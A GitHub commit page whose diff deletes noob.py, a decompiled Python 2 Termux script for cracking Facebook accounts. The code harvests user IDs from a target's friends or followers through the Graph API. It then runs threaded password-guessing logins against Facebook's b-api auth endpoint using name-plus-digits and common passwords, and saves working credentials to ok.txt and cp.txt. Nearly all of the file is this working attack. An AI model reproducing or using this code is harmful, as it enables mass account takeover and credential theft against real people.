
AdnanAdifHisham
/
noob
Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights
Delete noob.py
 main
@AdnanAdifHisham
AdnanAdifHisham committed 18 minutes ago
1 parent d1d1180 commit 235f4055aa20d59ad663d0dec4e0c278b9c1a583
Showing  with 0 additions and 414 deletions.
 414  noob.py 
@@ -1,414 +0,0 @@
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: JAM-BACK
try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 cracker.indirect')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
from requests.exceptions import ConnectionError
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('cd ..... && pip install progress')
    os.system('cd ..... && npm install')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    os.system('clear')
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;92m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;91m'
logo = '                                          \n\x1b[1;91m           _____  _   _          _   _ \n\x1b[1;92m\n\x1b[1;93m|     /\   |  __ \| \ | |   /\   | \ | |\n\x1b[1;98m|\n\x1b[1;95m    /  \  | |  | |  \| |  /  \  |  \| |\n\x1b[1;96mn\x1b[1;97m   / /\ \ | |  | | . ` | / /\ \ | . ` |\n\x1b[1;96m\n\x1b[1;91m  / ____ \| |__| | |\  |/ ____ \| |\  |\n\x1b[1;92m\n\x1b[1;93m| /_/    \_\_____/|_| \_/_/    \_\_| \_|\n\x1b[1;98m|\n-----------------------------------------------\n\x1b[1;96m(~)\x1b[1;97m Author : GHOST RIDER \x1b[1;97m[ \x1b[0;92mADNAN\x1b[1;97m]\n\x1b[1;96m(~)\x1b[1;97m Github : https://github.com/AdnanAdifHisham\n\x1b[1;96m(~)\x1b[1;97m Facebook     : Adnan Adif Hisham  \n\x1b[1;97m-----------------------------------------------\n'

def main():
    os.system('clear')
    print logo
    print ''
    print ('\x1b[0;97m[ Starting Main Menu ]').center(50)
    print ''
    print '\x1b[1;97m[1]\x1b[1;91m > \x1b[1;97mClone Public ID With b-api'
    print ''
    print '\x1b[1;97m[2]\x1b[1;91m > \x1b[1;97mMore Termux Command'
    print ''
    print '\x1b[1;97m[0]\x1b[1;91m > \x1b[1;97mlogout tool'
    print ''
    main_select()


def main_select():
    madman = raw_input('\x1b[1;97m[!] Select --->\x1b[1;96m ')
    if madman == '1':
        login()
    if madman == '2':
        os.system('xdg-open https://github.com/AdnanAdifHisham')
        main()
    elif madman == '0':
        os.system('exit')
    else:
        print ('[!] Please select a valid option').center(50)
        time.sleep(2)
        main()


def login():
    os.system('clear')
    print logo
    print ''
    print ('\x1b[0;97m[ Login Main Menu ]').center(50)
    print ''
    print '\x1b[1;97m[1]\x1b[1;91m > \x1b[1;97mlogin using token'
    print ''
    print '\x1b[1;97m[2]\x1b[1;91m > \x1b[1;97mlogin using password'
    print ''
    print '\x1b[1;97m[3]\x1b[1;91m > \x1b[1;97mMain menu back'
    print ''
    login_select()


def login_select():
    madman = raw_input(' \x1b[1;97mOption :\x1b[1;96m ')
    if madman == '1':
        os.system('clear')
        print logo
        print ''
        print ('[ login with token ]').center(50)
        print ''
        token = raw_input('[!] Token ? \x1b[0;90m')
        token_s = open('.fb_token.txt', 'w')
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + token)
            q = json.loads(r.text)
            name = q['name']
            nm = name.rsplit(' ')[0]
            print ''
            print ('\x1b[1;92mYour token login successfully').center(50)
            time.sleep(1)
            os.system('xdg-open https://github.com/MajidYarSahu381')
            time.sleep(1)
            menu()
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91mToken invalid or account has checkpoint\x1b[0;97m').center(50)
            print ''
            time.sleep(2)
            login()

    elif madman == '2':
        login_fb()
    elif madman == '3':
        main()
    else:
        print ''
        print ('Select a valid option').center(50)
        print ''
        login_select()


def login_fb():
    os.system('clear')
    print logo
    print ''
    print ('[ login with password ]').center(50)
    print ''
    id = raw_input('[!] \x1b[1;93m Email/ID/Number :\x1b[1;97m ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input('[!] \x1b[1;93m Passwor :\x1b[1;97m ')
    print ''
    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
    q = json.loads(data)
    if 'access_token' in q:
        login_s = open('.login.txt', 'w')
        login_s.write(q['access_token'])
        login_s.close()
        print '\t\x1b[1;92mLogin Ok With Sahu\x1b[0;97m'
        time.sleep(1)
        menu()
    elif 'www.facebook.com' in q['error_msg']:
        print '\n\x1b[1;91m[!] Login Failed . Account Has a Checkpoint\x1b[0;97m'
        time.sleep(1)
        login_fb()
    else:
        print '\n\x1b[1;91m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\x1b[0;97m'
        time.sleep(1)
        login_fb()


def menu():
    global token
    os.system('clear')
    print logo
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print ('login account has checkpoint').center(50)
        print ''
        os.system('rm -rf .fb_token.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print ('Your internet connection not working').center(50)
        print ''
        time.sleep(2)
        menu()

    os.system('clear')
    print logo
    print ''
    print '\t\x1b[1;92mHello : ' + nm
    print ''
    print '\x1b[1;92m[1]\x1b[1;91m > \x1b[1;97mCrack From Friendlist'
    print ''
    print '\x1b[1;93m[2]\x1b[1;91m > \x1b[1;97mCrack From Public id'
    print ''
    print '\x1b[1;93m[3]\x1b[1;91m > \x1b[1;97mCrack From Followers id'
    print ''
    print '\x1b[1;97m[0]\x1b[1;91m > \x1b[1;97mlogout'
    print ''
    menu_select()


def menu_select():
    select = raw_input('\x1b[1;93mOption : ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    if select == '2':
        os.system('clear')
        print logo
        print ''
        idt = raw_input('\x1b[1;97m[!] Put Target/ID :\x1b[1;96m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            print '[!] Target from : ' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91your login account has checkpoint').center(50)
            print ''
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        os.system('clear')
        print logo
        print ''
        idt = raw_input('\x1b[1;97m[!] Put Target/ID :\x1b[1;96m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print ' Target from  : ' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91m login id has checkpoint').center(50)
            print ''
            time.sleep(3)
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        os.system('exit')
    else:
        print ''
        print ('Please Select A Valid Option').center(50)
        time.sleep(2)
        menu_select()
    print '[!] Total IDs : ' + str(len(id))
    time.sleep(0.5)
    print '[!] Plz wait clone account will be appear here'
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '[CP] ' + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;96m[OK] ' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '1234'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '[CP] ' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;96m[OK] ' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '[CP] ' + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print ' \x1b[1;96m[OK] ' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '786'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '[CP] ' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;96m[OK] ' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = '786786'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '[CP] ' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;96m[OK] ' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = '223344'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '[CP] ' + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;96m[OK] ' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = 'Pakistan'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '[CP] ' + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;96m[OK] ' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' '
    print 47 * '-'
    print '[!] Process has completed'
    print '[!] Total Cp/Ok : ' + str(len(cps)) + '/' + str(len(oks))
    print 47 * '-'
    raw_input('\t\x1b[0;97mPress enter to main menu back')
    menu()


if __name__ == '__main__':
    main()
